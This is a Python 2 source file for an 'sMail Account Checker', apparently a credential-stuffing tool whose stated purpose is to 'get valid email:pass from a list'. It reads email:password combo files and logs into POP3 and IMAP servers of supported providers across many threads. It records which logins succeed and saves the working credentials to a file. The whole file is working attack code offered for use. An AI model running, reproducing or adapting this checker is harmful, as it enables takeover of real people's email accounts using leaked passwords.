# Python sMail Acc Checker
# author: m0nk3y
# With this tool you can get valid email:pass from a list

import argparse
import csv
import imaplib
import linecache
import poplib
import sys
import time
import xml_parser
import Provider
import threading
import Queue
import socket

parser = argparse.ArgumentParser(description='This tool checks a given list for valid email accounts (testing default: POP3)')
parser.add_argument('-f','--file', help='File with <email>:<pass> each line',required=False,default=None)
parser.add_argument('-s','--sleep', help='Pause in seconds between each check',required=False,default=0)
parser.add_argument('-p','--provider', help='Specify a provider -p [tag] (e.g. gmail.com)',required=False,default=None)
parser.add_argument('-t','--threads', help='Specify the amount of threads to be used',required=False,default=1)
parser.add_argument('-z','--timeout', help='Timeout for a try, default: 5sec',required=False,default=5)
parser.add_argument('-o','--output', help='Filename to write output into',required=False,default=False)
parser.add_argument('-n','--invalid', help='Filename to write invalid output into',required=False,default=False)
parser.add_argument('-i','--imap', help='use IMAP first, then POP3 for unchecked. Some provider only offers IMAP.',required=False,action="store_true")
parser.add_argument('-v','--verbose', help='Show Debug-msgs.',required=False,action="store_true")
parser.add_argument('-l','--list', help='List all supported provider tags',required=False,action="store_true")
parser.add_argument('-c','--colorize', help='Add color to output',required=False,action="store_true")

args = parser.parse_args()

providers = []
providers_imap = []
accounts = []

q = Queue.Queue()

results = []
invalid = []
threads = []

socket.setdefaulttimeout(int(args.timeout))

class c:
    HEADER = ''
    OKBLUE = ''
    OKGREEN = ''
    WARNING = ''
    FAIL = ''
    ENDC = ''
    BOLD = ''
    UNDERLINE = ''
    if args.colorize:
        HEADER = '\033[95m'
        OKBLUE = '\033[94m'
        OKGREEN = '\033[92m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        ENDC = '\033[0m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'

def main():

    addProvidersFromXML()

    print  c.HEADER+"[***************************]"
    print "[*  sMail Account Checker  *]"
    print "[***************************]"+c.ENDC
    print c.FAIL+"    ---- by m0nk3y ----"+c.ENDC
    print "(Hint: Try this with colors -c)\n"

    if args.list:
        listProviders()
        exit(1)

    if args.file == None:
        print c.FAIL+c.BOLD+"No inputfile given. Try --help for more info"+c.ENDC
        exit(1)
    print "[~] File: " + c.BOLD+ args.file + c.ENDC
    print "[~] Sleep: " + c.BOLD+ str(args.sleep) + c.ENDC
    print "[~] Threads: " + c.BOLD+ str(args.threads) + c.ENDC
    try:
        parseEmails(args.file)
    except:
        PrintException()

    print "[~] Acounts in file: " + c.BOLD+ str(len(accounts)) + c.ENDC
    time.sleep(2)
    print c.BOLD+c.WARNING+"[*] Testing Accounts"+c.ENDC

    if len(accounts) > 0 and args.threads > 0:

        for a in accounts:
            q.put(a)

        create_workers(args.threads)
        #testAccounts(providers,args.sleep)

        for t in threads:
            t.join()
        printResult()
    else:
        print c.FAIL+c.BOLD+"\nCouldn't find any account in your file (wrong filename?)\n"+c.ENDC
        print "-> "+args.file


def create_workers(i):

    for _ in range(int(i)):
        t = threading.Thread(target=work)
        threads.append(t)
        #t.daemon = True
        t.start()



def work():
    while True:

        if q.qsize() < 1:
            break


        printl("Starting work")
        acc = q.get()
        size = q.qsize()
        if q.qsize() % 50 == 0 and q.qsize() != 0:
            print "[!] "+str(q.qsize())+" accounts to go!"

        if len(acc) == 2:
            email = acc[0]
            passwd = acc[1]
        else:
            printl("no valid acc: "+str(acc))
            return

        for provider in providers:
            services = provider.getServices()
            domain = provider.getDomain()

            if args.provider != None:
                if domain != args.provider:
                    continue

            if "@"+domain not in email:
                continue
            printl(c.BOLD+"\n[*] Checking provider "+c.UNDERLINE+domain+c.ENDC + " for "+email)

            for s in services:
                    printl("testing services for domain: "+domain)
                    if (login(s, email, passwd)):
                        accounts.remove(acc)
                        break
        q.task_done()
    return

def printl(string):
    if args.verbose:
        print "[:Debug:] "+string

def listProviders():
    global providers
    global providers_imap

    print "\n"+c.BOLD+c.OKGREEN+str(len(providers))+" providers are supported. "+c.ENDC

def printResult():
    global results
    global invalid
    print c.BOLD+"\n[=] Valid accounts found: "+str(len(results))+c.ENDC
    print str(len(accounts)-len(invalid))+" not tested"
    for r in results:
        print r

def login(service, email, passwd):

    time.sleep(int(args.sleep))

    printl ("Testing "+service.getHost()+" with "+ email + ":" + passwd)
    type = service.getType()
    port = service.getPort()
    host = service.getHost()
    printl ("Provider type: "+str(type)+" port: "+str(port))

    acc = email+":"+passwd

    if type == "pop3" and port == 995:
        printl("Testing secure POP3 on "+str(port))

        try:
            pop = poplib.POP3_SSL(host, port)

            pop.user(email)
            pop.pass_(passwd)
            pop.quit()
            print c.BOLD+c.OKGREEN+"[!] "+email+"\t "+type+":"+str(port)+" success!"+c.ENDC

            if acc not in results:
                results.append(acc)
                if args.output!=False:
                    try:
                        writeIntoFile(args.output, acc)
                    except:
                        PrintException()
            pop.quit()
            return True

        except:
            printl(c.FAIL+"[!] "+email+"\t "+type+":"+str(port)+" failed!"+c.ENDC)
            if acc not in invalid:
                invalid.append(acc)
                if args.invalid!=False:
                    try:
                        writeIntoFile(args.invalid, acc)
                    except:
                        PrintException()

    elif type == "pop3":

        printl("Testing POP3 on "+str(port))
        try:
            pop = poplib.POP3(host, port)
            pop.user(email)
            pop.pass_(passwd)
            pop.quit()
            print c.BOLD+c.OKGREEN+"[!] "+email+"\t "+type+":"+str(port)+" success!"+c.ENDC

            if acc not in results:
                results.append(acc)
                if args.output!=False:
                    try:
                        writeIntoFile(args.output, acc)
                    except:
                        PrintException()
            pop.quit()
            return True

        except:
            printl(c.FAIL+"[!] "+email+"\t on "+type+":"+str(port)+" failed!"+c.ENDC)
            if acc not in invalid:
                invalid.append(acc)
                if args.invalid!=False:
                    try:
                        writeIntoFile(args.invalid, acc)
                    except:
                        PrintException()

    elif type == "imap" and port == 993:
        printl("Testing secure IMAP on "+str(port))
        try:
            mail = imaplib.IMAP4_SSL(host)
            mail.login(email, passwd)
            print c.BOLD+c.OKGREEN+"[!] "+email+"\t "+type+":"+str(port)+" success!"+c.ENDC
            typ, data = mail.list()
            #mail.close()
            mail.logout()
            if acc not in results:
                results.append(acc)
                if args.output!=False:
                    try:
                        writeIntoFile(args.output, acc)
                    except:
                        PrintException()
            return True

        except:
            printl(c.FAIL+"[!] "+email+"\t "+type+":"+str(port)+" failed!"+c.ENDC)
            if acc not in invalid:
                invalid.append(acc)
                if args.invalid!=False:
                    try:
                        writeIntoFile(args.invalid, acc)
                    except:
                        PrintException()

    elif type == "imap":
        printl("Testing IMAP on "+str(port))
        try:
            mail = imaplib.IMAP4(host)
            mail.login(email, passwd)
            print c.BOLD+c.OKGREEN+"[!] "+email+"\t "+type+":"+str(port)+" success!"+c.ENDC
            typ, data = mail.list()
            #mail.close()
            mail.logout()
            if acc not in results:
                results.append(acc)
                if args.output!=False:
                    try:
                        writeIntoFile(args.output, acc)
                    except:
                        PrintException()
            return True

        except:
            printl(c.FAIL+"[!] "+email+"\t "+type+":"+str(port)+" failed!"+c.ENDC)
            if acc not in invalid:
                invalid.append(acc)
                if args.invalid!=False:
                    try:
                        writeIntoFile(args.invalid, acc)
                    except:
                        PrintException()

    else:
        printl("no method for "+type+ " on " + str(port))

    return False

def testAccounts(providers,sleep):
    global results
    global invalid
    global accounts

    for provider in providers:
        services = provider.getServices()
        domain = provider.getDomain()

        printl ("Domain: "+domain)

        if args.provider != None:
            if domain != args.provider:
                continue

        for acc in accounts:
            if len(acc) != 2:
                continue
            email = acc[0]
            passwd = acc[1]

            if domain not in email:
                printl(domain + " not in "+email)
                continue
            print c.BOLD+"\n[*] Checking provider "+c.UNDERLINE+domain+c.ENDC
            printl("Checking "+email)

            for s in services:
                printl("testing services for domain: "+domain)
                if (login(s, email, passwd)):
                    accounts.remove(acc)
                    break


            time.sleep(sleep)

def testAccountsIMAP(providers_imap, sleep):
    global results
    global invalid
    global accounts

    for provider in providers_imap:
        if args.provider != None:
            if provider.tag != args.provider:
                continue
        print c.BOLD+"\n[*] Checking IMAP for provider "+c.UNDERLINE+provider.tag+c.ENDC

        for acc in accounts:
            if len(acc) != 2:
                continue
            email = acc[0]
            passwd = acc[1]

            if email.find(provider.tag) == -1:
                continue
            #print "[-] Checking "+email

            try:
                mail = imaplib.IMAP4_SSL(provider.server)
                mail.login(email, passwd)
                print c.BOLD+c.OKGREEN+"[!] "+email+"\t success!"+c.ENDC
                typ, data = mail.list()
                mail.logout()
                results.append(email+":"+passwd)
                accounts.remove(acc)
                if args.output!=False:
                    try:
                        writeIntoFile(args.output, email+":"+passwd)
                    except:
                        PrintException()

            except:
                print c.FAIL+"[!] "+email+"\t failed!"+c.ENDC
                #invalid.append(email+":"+passwd)
                if args.invalid!=False:
                    try:
                        writeIntoFile(args.invalid, email+":"+passwd)
                    except:
                        PrintException()

            time.sleep(sleep)

def parseEmails(file):
    global accounts
    with open(file,'r') as f:
        #next(f) # skip headings
        reader=csv.reader(f,delimiter=':')
        for line in reader:
           accounts.append(line)

def PrintException():
    exc_type, exc_obj, tb = sys.exc_info()
    f = tb.tb_frame
    lineno = tb.tb_lineno
    filename = f.f_code.co_filename
    linecache.checkcache(filename)
    line = linecache.getline(filename, lineno, f.f_globals)
    print 'EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_obj)


def writeIntoFile(filename, value):
    global c
    if value != None:
        with open(filename, "a") as file:
            file.write(value+"\n")
        file.close()
    else:
        print c.FAIL+c.BOLD+"Error while creating File :: no content given"+c.ENDC

def addProvidersFromXML():

    providers_xml = xml_parser.getProviders();
    printl ("Adding from xml: " + str(len(providers_xml)))
    for p in providers_xml:
        services_provider = []
        prov = Provider.Provider(p.getDisplayName(), p.getDomain())
        services_provider = p.getIncomingServers()
        for s in services_provider:
            prov.setService(Provider.Service(s[0], s[1], s[2]))

        providers.append(prov)
        printl("added: "+ p.getDisplayName())



# Here starts the magic :)
start_time = time.time()
main()
print("--- %s seconds ---" % (time.time() - start_time))